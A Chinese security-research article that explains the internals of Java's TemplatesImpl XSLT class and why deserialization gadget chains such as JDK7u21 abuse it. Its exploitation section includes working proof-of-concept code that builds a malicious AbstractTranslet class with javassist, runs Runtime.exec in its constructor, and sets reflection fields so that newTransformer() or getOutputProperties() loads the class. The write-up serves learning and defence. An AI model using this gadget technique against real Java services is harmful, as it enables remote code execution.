> 原文链接: https://www.anquanke.com//post/id/247044 


# 由JDK7u21反序列化漏洞引起的对TemplatesImpl的深入学习


                                阅读量   
                                **57575**
                            
                        |
                        
                                                                                    



[![](https://p0.ssl.qhimg.com/t01227c4ffb96025ab7.jpg)](https://p0.ssl.qhimg.com/t01227c4ffb96025ab7.jpg)



最近在分析JDK7u21反序列化漏洞，对命令执行载体`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`的利用点不太明白。除了JDK7u21，`TemplatesImpl`在很多反序列化漏洞中都被利用了，所以想要深入探究下它到底是做什么用的，有什么特性被利用。接下来本文将从这两个问题进行探索学习。



## 一、了解TemplatesImpl

### <a class="reference-link" name="1%E3%80%81XSLT"></a>1、XSLT

**在开始前首先了解下[XSLT](https://www.runoob.com/xsl/xsl-transformation.html)：**

XSL 指扩展样式表语言（EXtensible Stylesheet Language）, 它是一个 XML 文档的样式表语言，类似CSS之于HTML；<br>
XSLT（Extensible Stylesheet Language Transformations）是XSL转换语言，它是XSL的一部分，用于转换 XML 文档，可将一种 XML 文档转换为另外一种 XML 文档，如XHTML；

**简化版[XSLT实例](https://www.runoob.com/try/tryxslt.php?xmlfile=cdcatalog&amp;xsltfile=cdcatalog_ex1)：**

我们从一个例子来了解下XSLT，将XML转为HTML格式展示。<br>
XML：cdcatalog.xml，保存了文章数据包括文章标题、作者等。

```
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!-- 这里加上这句 将向XML文档添加下面cdcatalog.xsl的样式表引用 --&gt;
&lt;!-- &lt;?xml-stylesheet type="text/xsl" href="cdcatalog.xsl"?&gt; --&gt;
&lt;catalog&gt;
  &lt;cd&gt;
    &lt;title&gt;Empire Burlesque&lt;/title&gt;
    &lt;artist&gt;Bob Dylan&lt;/artist&gt;
    &lt;country&gt;USA&lt;/country&gt;
    &lt;company&gt;Columbia&lt;/company&gt;
    &lt;price&gt;10.90&lt;/price&gt;
    &lt;year&gt;1985&lt;/year&gt;
  &lt;/cd&gt;
  &lt;cd&gt;
    &lt;title&gt;Hide your heart&lt;/title&gt;
    &lt;artist&gt;Bonnie Tyler&lt;/artist&gt;
    &lt;country&gt;UK&lt;/country&gt;
    &lt;company&gt;CBS Records&lt;/company&gt;
    &lt;price&gt;9.90&lt;/price&gt;
    &lt;year&gt;1988&lt;/year&gt;
  &lt;/cd&gt;
&lt;/catalog&gt;
```

XSL：cdcatalog.xsl<br>
XSL 样式表的根元素是 `&lt;xsl:stylesheet&gt;` 或 `&lt;xsl:transform&gt;`；<br>`&lt;xsl:output&gt;`元素定义了输出文档的格式；<br>
XSL 样式表由一个或多个被称为模板（template）的规则组成，&lt;xsl:template&gt; 元素用于构建模板。

```
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;
    &lt;!-- 表示输出是 HTML 文档，版本是 4.0，字符编码方式被设置为 "ISO-8859-1"，输出会进行缩进，以增进可读性 --&gt;
    &lt;xsl:output method="html" version="4.0" encoding="iso-8859-1" indent="yes"/&gt;
    &lt;xsl:template match="/"&gt;
        &lt;html&gt;
            &lt;body&gt;
                &lt;h2&gt;My CD Collection&lt;/h2&gt;
                &lt;table border="1"&gt;
                    &lt;tr&gt;
                        &lt;th style="text-align:left"&gt;Title&lt;/th&gt;
                        &lt;th style="text-align:left"&gt;Artist&lt;/th&gt;
                    &lt;/tr&gt;
                    &lt;xsl:for-each select="catalog/cd"&gt;
                        &lt;tr&gt;
                            &lt;td&gt;&lt;xsl:value-of select="title"/&gt;&lt;/td&gt;
                            &lt;td&gt;&lt;xsl:value-of select="artist"/&gt;&lt;/td&gt;
                        &lt;/tr&gt;
                    &lt;/xsl:for-each&gt;
                &lt;/table&gt;
            &lt;/body&gt;
        &lt;/html&gt;
    &lt;/xsl:template&gt;
&lt;/xsl:stylesheet&gt;
```

转换结果如下，读取xml的元素并展示为html格式：

|Title|Artist
|------
|Empire Burlesque|Bob Dylan
|Hide your heart|Bonnie Tyler

### <a class="reference-link" name="2%E3%80%81javax.xml.transform.Templates"></a>2、javax.xml.transform.Templates

TemplatesImpl实现了`javax.xml.transform.Templates`接口，`javax.xml.transform`属于JAXP（Java API for XMLProcessing，提供解析和验证XML文档的能力），是一个处理XSL转换（XSLT）的包，定义了用于处理转换指令以及执行从源到结果的转换的API。`javax.xml.transform.Templates`是用来处理XSLT模板的，它只定义了两个方法：

|Modifier and Type|Method and Description
|------
|`Properties`|`getOutputProperties()` 获取xsl:output元素相对应的属性。
|`Transformer`|`newTransformer()` 为此Templates对象创建一个新的转换上下文。

### <a class="reference-link" name="3%E3%80%81XSLTC%E5%92%8CTranslets"></a>3、XSLTC和Translets

TemplatesImpl在`com.sun.org.apache.xalan.internal.xsltc`包下，xalan是Apache的一个项目，是XSLT处理器。

XSLTC指xslt compiler或xslt compiling，可以把XSLT文件编译成一个或者多个Java的class文件，通过这种方式可以加速xsl的转换速度。**这些class或者class的集合被称为Translets，他们被转换时自动会继承AbstractTranslet。**<br>
利用Xalan命令行工具（注意使用jdk1.8以前版本）将XSLT文件转为class：

```
java com.sun.org.apache.xalan.internal.xsltc.cmdline.Compile cdcatalog.xsl
```

执行命令后会在文件夹下生成一个class文件：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t010ac6ad67f2c08f92.png)

### <a class="reference-link" name="4%E3%80%81TemplatesImpl%E7%B1%BB%E8%A7%A3%E8%AF%BB"></a>4、TemplatesImpl类解读

TemplatesImpl主要是通过获取Translet的Class或字节码来创建 XSLTC 模板对象。根据上面第3点的学习这里不难理解，XSLTC生成的Translets，需要转为模板对象，可以用TemplatesImpl定义和处理。

```
public final class TemplatesImpl implements Templates, Serializable

```

#### <a class="reference-link" name="4.1%E3%80%81%E9%9D%99%E6%80%81%E5%86%85%E9%83%A8%E7%B1%BBTransletClassLoader%EF%BC%9A"></a>4.1、静态内部类TransletClassLoader：

TemplatesImpl通过获取Translet的Class或字节码来创建 XSLTC 模板对象，需要在运行时加载class，因此其在内部自定义了一个静态类TransletClassLoader用来加载Translet的Class对象，并且重载了loadClass和defineClass方法。

我们知道ClassLoader的loadClass通过一个类名全称返回一个Class类的实例；<br>
而defineClass通过接收一组字节，然后将其具体化为一个Class类的实例，它一般从磁盘上加载一个文件，然后将文件的字节码传递给JVM，通过JVM（native 方法）对于Class的定义将其实例化为一个Class类的实例。

```
static final class TransletClassLoader extends ClassLoader %7B
    private final Map&lt;String,Class&gt; _loadedExternalExtensionFunctions;

     TransletClassLoader(ClassLoader parent) %7B
         super(parent);
        _loadedExternalExtensionFunctions = null;
    %7D

    TransletClassLoader(ClassLoader parent,Map&lt;String, Class&gt; mapEF) %7B
        super(parent);
        _loadedExternalExtensionFunctions = mapEF;
    %7D

    public Class&lt;?&gt; loadClass(String name) throws ClassNotFoundException %7B
        Class&lt;?&gt; ret = null;
        // 当SecurityManager未设置且FSP关闭时，_loaddexternalextensionfunctions将为空
        if (_loadedExternalExtensionFunctions != null) %7B
            ret = _loadedExternalExtensionFunctions.get(name);
        %7D
        if (ret == null) %7B
            // 调用super.loadClass，通过类全称获取Class类实例
            ret = super.loadClass(name);
        %7D
        return ret;
     %7D

    // 从外部类访问protected修饰的父类方法。
    Class defineClass(final byte[] b) %7B
        // 调用super.defineClass，通过字节码来获取Class类实例
        return defineClass(null, b, 0, b.length);
    %7D
%7D
```

#### <a class="reference-link" name="4.2%E3%80%81%E5%B1%9E%E6%80%A7%E8%AF%B4%E6%98%8E%EF%BC%9A"></a>4.2、属性说明：

|修饰及类型|属性名、属性值及说明
|------
|public final static String|DESERIALIZE_TRANSLET = “jdk.xml.enableTemplatesImplDeserialization”
|private static String|ABSTRACT_TRANSLET = “com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet” 所有translets的超类名。这里的Translet类都需要继承AbstractTranslet
|private String|_name = null 主类的名称或默认名称(如果未知)
|private byte[][]|_bytecodes = null 包含Translet类和任何辅助类的实际类定义的字节码
|private Class[]|_class = null 包含Translet类定义。这些是在创建模板或从磁盘读取模板时创建的
|private int|_transletIndex = -1 主Translet类在数组_class[]和_bytecodes中的索引
|private transient Map&lt;String, Class&lt;?&gt;&gt;|_auxClasses = null 包含辅助类定义的列表
|private Properties|_outputProperties translet的output属性
|private int|_indentNumber 要为输出缩进添加的空格数
|private transient URIResolver|_uriResolver = null URIResolver被传递给所有的transformer
|private transient|ThreadLocal _sdom = new ThreadLocal();
|private transient|TransformerFactoryImpl _tfactory = null 该模板对象所属的TransformerFactory的引用
|private transient boolean|_overrideDefaultParser 确定系统默认解析器是否可以被重写的标志
|private transient String|_accessExternalStylesheet = XalanConstants.EXTERNAL_ACCESS_DEFAULT 协议允许样式表处理指令、Import和Include元素设置外部引用

#### <a class="reference-link" name="4.3%E3%80%81%E6%9E%84%E9%80%A0%E6%96%B9%E6%B3%95%E8%A7%A3%E6%9E%90%EF%BC%9A"></a>4.3、构造方法解析：

TemplatesImpl提供了两个有参构造方法都是protected，如果TemplatesImpl要实例化，需要通过内部方法进行调用。

构造方法1：通过字节码创建template对象，必须提供translet和辅助类的字节码，以及主translet类的名称。

```
protected TemplatesImpl(byte[][] bytecodes, String transletName, Properties outputProperties, int indentNumber, TransformerFactoryImpl tfactory)
%7B
    _bytecodes = bytecodes;
    init(transletName, outputProperties, indentNumber, tfactory);
%7D
```

构造方法2：通过translet类创建XSLTC模板对象。

```
protected TemplatesImpl(Class[] transletClasses, String transletName, Properties outputProperties, int indentNumber, TransformerFactoryImpl tfactory)
%7B
    _class     = transletClasses;
    _transletIndex = 0;
    init(transletName, outputProperties, indentNumber, tfactory);
%7D
```

#### <a class="reference-link" name="4.4%E3%80%81Templates%E6%8E%A5%E5%8F%A3%E6%96%B9%E6%B3%95%E5%AE%9E%E7%8E%B0%EF%BC%9A"></a>4.4、Templates接口方法实现：

首先是Templates接口的两个方法：newTransformer和getOutputProperties，newTransformer会调用TransformerImpl有参构造方法。

```
// 实现JAXP's Templates.newTransformer()
public synchronized Transformer newTransformer()
    throws TransformerConfigurationException
%7B
    TransformerImpl transformer;

    //调用TransformerImpl构造函数创建一个TransformerImpl实例
    transformer = new TransformerImpl(getTransletInstance(), _outputProperties,
        _indentNumber, _tfactory);

    if (_uriResolver != null) %7B
        transformer.setURIResolver(_uriResolver);
    %7D

    if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) %7B
        transformer.setSecureProcessing(true);
    %7D
    return transformer;
%7D

// 实现了JAXP的Templates.getOutputProperties()。需要实例化一个translet以获得输出属性，因此我们可以实例化一个Transformer来调用它。
public synchronized Properties getOutputProperties() %7B
    try %7B
        return newTransformer().getOutputProperties();
    %7D
    catch (TransformerConfigurationException e) %7B
        return null;
    %7D
%7D
```

#### <a class="reference-link" name="4.5%E3%80%81%E6%96%B9%E6%B3%95%E8%AF%B4%E6%98%8E%EF%BC%9A"></a>4.5、方法说明：

|修饰|方法
|------
|private void|defineTransletClasses()：定义Translet类和辅助类。
|java.util.Properties|getOutputProperties()：实现了JAXP的Templates.getOutputProperties()。
|DOM|getStylesheetDOM()：返回样式表DOM的线程本地副本。
|byte[][]|getTransletBytecodes()： 返回Translet字节码
|java.lang.Class[]|getTransletClasses()：返回Translet字节码
|int|getTransletIndex()： 返回主类在字节码数组中的索引
|private Translet|getTransletInstance()：生成Translet类的实例。
|protected java.lang.String|getTransletName()：返回Translet主类的名称
|javax.xml.transform.Transformer|newTransformer()：实现了JAXP的Templates.newTransformer ()
|private void|readObject(java.io.ObjectInputStream is)：重写readObject
|void|setStylesheetDOM(DOM sdom)：设置样式表DOM的线程本地副本
|protected void|setTransletBytecodes(byte[][] bytecodes)：获取TransformerFactory设置的Translet字节码并创建Translet实例。
|protected void|setTransletName(java.lang.String name)：TransformerFactory调用此方法来设置Translet名称
|void|setURIResolver(javax.xml.transform.URIResolver resolver)：设置Transformer所需的URIResolver。
|private void|writeObject(java.io.ObjectOutputStream os)：实现了URIResolver和Serializable的类将被序列化

### <a class="reference-link" name="5%E3%80%81XML-XSLT-HTML%E5%9C%A8Java%E4%B8%AD%E7%9A%84%E8%BD%AC%E6%8D%A2%E5%AE%9E%E4%BE%8B"></a>5、XML-XSLT-HTML在Java中的转换实例

接下来我们看一个XML-XSLT-HTML的常规转换例子，通过这个例子我们可以知道转换在Java中实现的步骤。

```
import javax.xml.transform.*;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;

public class TestTmp %7B

    public static void main(String[] args) throws TransformerException, FileNotFoundException %7B
        new TestTmp().testTransform();
    %7D

    public void testTransform() throws TransformerException, FileNotFoundException %7B
        /*---- 1、使用TransformFactory的newInstance方法创建一个新的实例。-------------------*/
        // TransformFactory的缺省实现 是com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl类
        TransformerFactory oFactory = TransformerFactory.newInstance();

        /*---- 2、使用TransformFactory的newTemplates方法创建一个Templates界面的实现对象。-------------------*/
        //Templates的缺省实现 是org.apache.xalan.templates.StylesheetRoot
        Templates oTemplates = oFactory.newTemplates(
                //使用一个StreamSource对象来读取一个xsl文档
                new javax.xml.transform.stream.StreamSource("cdcatalog.xsl")
        );

        /*---- 3、使用Templates的newTransformer方法创建一个新的Transformer。 -------------------*/
        //Transformer的缺省实现 是com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl
        Transformer transformer = oTemplates.newTransformer();

        /*---- 4、使用Transformer进行转换。  -------------------*/
        transformer.transform(
                //创建一个StreamSource对象来读取atom.xml
                new javax.xml.transform.stream.StreamSource("cdcatalog.xml"),
                //使用out作为输出writer创建一个StreamResult输出转换结果。
                new javax.xml.transform.stream.StreamResult(new FileOutputStream("E:\\1.html")));
    %7D
%7D
```

执行上面代码最终会在文件夹下生成一个1.html文件，1.html跟上述第一部分的示例转换结果一致。<br>
通过上面代码，我们可以总结出一个XML-XSLT-HTML的转换在Java中一般有以下4个步骤：
1. 创建一个TransformFactory对象；
1. 调用TransformFactory.newTemplates通过XSL样式表创建一个Templates对象；
1. 调用Templates.newTransformer创建一个Transformer对象；
1. 最后通过Transformer.transform将源-XML文档转换为目标-HTML文档。
其中需要注意的是以上接口的**缺省实现**都是Xalan提供的com.sun.org.apache.xalan库内对应的实现类来创建对象。

TransformFactory.newTemplates通过XSL样式表创建一个Templates对象，其实现主要由三个部分：
1. 如果_useClasspath属性为true，则尝试从CLASSPATH加载文件，并使用XSL样式表文件加载后的Class创建模板对象：调用new TemplatesImpl(new Class[]%7Bclazz%7D, transletName, null, _indentNumber, this)；
1. 如果_autoTranslet为true，将尝试在不编译样式表的情况下从translet类加载字节码来创建对象；
1. 以上两种条件不满足，直接创建并初始化样式表编译器来编译样式表，生成字节码，通过字节码创建模板对象。


## 二、TemplatesImpl被反序列化漏洞利用的特性

清楚了TemplatesImpl的方法和使用方式，接下来这部分我们探索下它跟反序列化漏洞的关系。

### <a class="reference-link" name="1%E3%80%81JDK7u21%E7%9A%84TemplatesImpl%E5%88%A9%E7%94%A8%E6%B5%8B%E8%AF%95"></a>1、JDK7u21的TemplatesImpl利用测试

我们将[JDK7u21分析poc](https://l3yx.github.io/2020/02/22/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/#TemplatesImpl)的`return templates;`改为`templates.newTransformer()`进行测试。

```
public void testTemplate() throws Exception %7B
    // 1、通过javassist创建一个Evil类的字节码，设置它的构造方法内部调用exec方法
    ClassPool pool = ClassPool.getDefault();//ClassPool对象是一个表示class文件的CtClass对象的容器
    CtClass cc = pool.makeClass("Evil");//创建Evil类
    cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));//设置Evil类的父类为AbstractTranslet
    CtConstructor cons = new CtConstructor(new CtClass[]%7B%7D, cc);//创建无参构造函数
    cons.setBody("%7B Runtime.getRuntime().exec(\"calc\"); %7D");//设置无参构造函数体
    cc.addConstructor(cons);
    byte[] byteCode = cc.toBytecode();//toBytecode得到Evil类的字节码
    byte[][] targetByteCode = new byte[][]%7BbyteCode%7D;
    // 2、创建一个TemplatesImpl对象，设置属性_bytecodes值为Evil类的字节码
    TemplatesImpl templates = TemplatesImpl.class.newInstance();
    setFieldValue(templates, "_bytecodes", targetByteCode);//设置_bytecodes是属性
    setFieldValue(templates, "_class", null);
    setFieldValue(templates, "_name", "xx");
    setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
    // 3、调用newTransformer()
    templates.newTransformer();
%7D

//通过反射为obj的属性赋值
private static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception %7B
    Field field = obj.getClass().getDeclaredField(fieldName);
    field.setAccessible(true);
    field.set(obj, value);
%7D
```

调用上述testTemplate方法，最终会弹出计算器：

[![](https://p4.ssl.qhimg.com/t01a73445d35ff83dd3.png)](https://p4.ssl.qhimg.com/t01a73445d35ff83dd3.png)

为什么能够执行`Runtime.getRuntime().exec(\"calc\")`，关键点在于第3步`templates.newTransformer();`，接下来重点分析下。

### 2、`newTransformer()`分析：

#### <a class="reference-link" name="2.1%E3%80%81newTransformer"></a>2.1、newTransformer

根据4.4我们知道newTransformer()会调用TransformerImpl构造函数创建实例：`new TransformerImpl(getTransletInstance(), _outputProperties, _indentNumber, _tfactory)`，getTransletInstance()会返回Translet类的实例；

#### <a class="reference-link" name="2.2%E3%80%81getTransletInstance"></a>2.2、getTransletInstance

getTransletInstance在一开始时对_name和_class实现进行了判断，当_name不为null而_class是null就会调用defineTransletClasses来获取Translet的Class对象，接着会调用newInstance实例化Translet。

```
//如果_name属性为null返回Translet是null
if (_name == null) return null;
// 如果_class属性是null调用defineTransletClasses
if (_class == null) defineTransletClasses();
// 当属性_class被赋值，即要转换的样式表class文件translet类存在，通过translet类来实例化
AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();
translet.postInitialization();
translet.setTemplates(this);
translet.setOverrideDefaultParser(_overrideDefaultParser);
translet.setAllowedProtocols(_accessExternalStylesheet);
if (_auxClasses != null) %7B
    // translet需要保留对所有辅助类的引用，以防止GC收集它们
    translet.setAuxiliaryClasses(_auxClasses);
%7D

return translet;
```

#### <a class="reference-link" name="2.3%E3%80%81defineTransletClasses%EF%BC%9A"></a>2.3、defineTransletClasses：

defineTransletClasses用来定义translet类和辅助类，会创建一个内部类TransletClassLoader的对象，通过该对象调用defineClass，根据之前4.1的分析我们知道defineClass会调用Java虚拟机的native方法生成一个Translet类的Class对象。所以到这里我们最终能够获取到Evil字节码生成的Class对象，再经过2.2`AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance()`对Evil类进行实例化，最终能够执行命令弹出计算器。以下是defineTransletClasses的关键代码摘取：

```
// 字节码未定义抛出异常
if (_bytecodes == null) %7B
    ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);
    throw new TransformerConfigurationException(err.toString());
%7D

//创建一个内部类TransletClassLoader的对象
TransletClassLoader loader = (TransletClassLoader)
    // 注意_tfactory.getExternalExtensionsMap()调用TransformerFactoryImpl的getExternalExtensionsMap，因此_tfactory我们要注意赋值，并且是TransformerFactoryImpl的实例
    AccessController.doPrivileged(new PrivilegedAction() %7B
        public Object run() %7Breturn new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());%7D%7D);

// 循环定义所有类，包括translet主类和它的内部类
_class = new Class[classCount];
for (int i = 0; i &lt; classCount; i++) %7B
    // 关键点 调用TransletClassLoader.defineClass通过字节码定义类
    _class[i] = loader.defineClass(_bytecodes[i]);
    final Class superClass = _class[i].getSuperclass();
    // 通过ABSTRACT_TRANSLET判断是否是主类
    if (superClass.getName().equals(ABSTRACT_TRANSLET)) %7B
        _transletIndex = i;
    %7D
    else %7B
        _auxClasses.put(_class[i].getName(), _class[i]);
    %7D
%7D
```

#### <a class="reference-link" name="2.4%E3%80%81%E5%B0%8F%E7%BB%93"></a>2.4、小结

通过前面3步的分析，执行恶意代码需要两个条件：一是调用defineTransletClasses获取Evil的Class对象，二是将Class对象**实例化**调用构造方法。

另外我们也能明白上面的属性为什么要被这样赋值：
<li>
`_bytecodes`被赋值为我们定义的恶意类的字节码，该类需要继承`com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet`（对应2.3的代码分析）</li>
<li>
`_class`必须为null（对应2.2的分析）</li>
<li>
`_name`必须不为null（对应2.2的分析）</li>
<li>
`_tfactory`必须是TransformerFactoryImpl实例（对应2.3的代码分析）</li>
### 3、由`newTransformer()`进行拓展

阅读[wEik1](https://blog.weik1.top/2021/01/15/TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE/)的分析后发现还可以拓展：

既然只要调用defineTransletClasses就能获取指定字节码定义的类的对象，那我们可以在TemplatesImpl类通过搜索寻找有没有其它方法调用defineTransletClasses。搜索后发现一共有3个方法（包括getTransletInstance）调用defineTransletClasses：

```
private Translet getTransletInstance()
public synchronized int getTransletIndex()
private synchronized Class[] getTransletClasses()

```

经过第2.4小结我们可以排除getTransletIndex和getTransletClasses，因为它们仅调用了getTransletInstance并没有进行实例化。那我们将目光聚集在getTransletInstance，它在内部除了被newTransformer()调用，也没有其它直接被调用的情况了，因此也被排除。本来到这里应该结束了，但我们不能忽略一点-newTransformer的调用，可以考虑通过newTransformer的调用来进行利用。newTransformer在内部有被getOutputProperties调用，getOutputProperties是public方法，并且getOutputProperties在内部不再被调用，因此总结下来共2个链可以实现恶意类的实例化：

```
newTransformer()-&gt;getTransletInstance()-&gt;defineTransletClasses()
getOutputProperties()-&gt;newTransformer()-&gt;getTransletInstance()-&gt;defineTransletClasses()
```



## 三、总结与思考

通过本次学习我们了解了`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`本身是用来进行xsl转换的，主要通过XSLTC接收xsl文档生成的Translets类的字节码来创建 XSLTC 模板对象。那么由于需要处理字节码，其在内部定义了类加载器并重载了defineClass，defineClass能够返回字节码的Class对象方便后续的实例化，而这也是我们能够利用它执行恶意代码的关键。

通过构造恶意类的字节码并使用defineClass返回其Class对象，实例化后即可执行我们想要的结果。继续思考，我们可以想到Java是否还存在类似的类（内部定义了类加载器并重载了defineClass）能被我们利用，这里不展开了可自行探索。



## 参考链接：

[https://xalan.apache.org/xalan-j/apidocs/org/apache/xalan/xsltc/trax/TemplatesImpl.html](https://xalan.apache.org/xalan-j/apidocs/org/apache/xalan/xsltc/trax/TemplatesImpl.html)<br>[https://www.runoob.com/xsl/xsl-transformation.html](https://www.runoob.com/xsl/xsl-transformation.html)<br>[https://docs.oracle.com/javase/7/docs/api/javax/xml/transform/Templates.html](https://docs.oracle.com/javase/7/docs/api/javax/xml/transform/Templates.html)<br>[https://blog.weik1.top/2021/01/15/TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE/](https://blog.weik1.top/2021/01/15/TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE/)<br>[http://terpconnect.umd.edu/~zhangx/xml/html/xmlprog/xalan/xsltc.html](http://terpconnect.umd.edu/~zhangx/xml/html/xmlprog/xalan/xsltc.html)<br>[https://blog.csdn.net/z_dy1/article/details/104427617](https://blog.csdn.net/z_dy1/article/details/104427617)
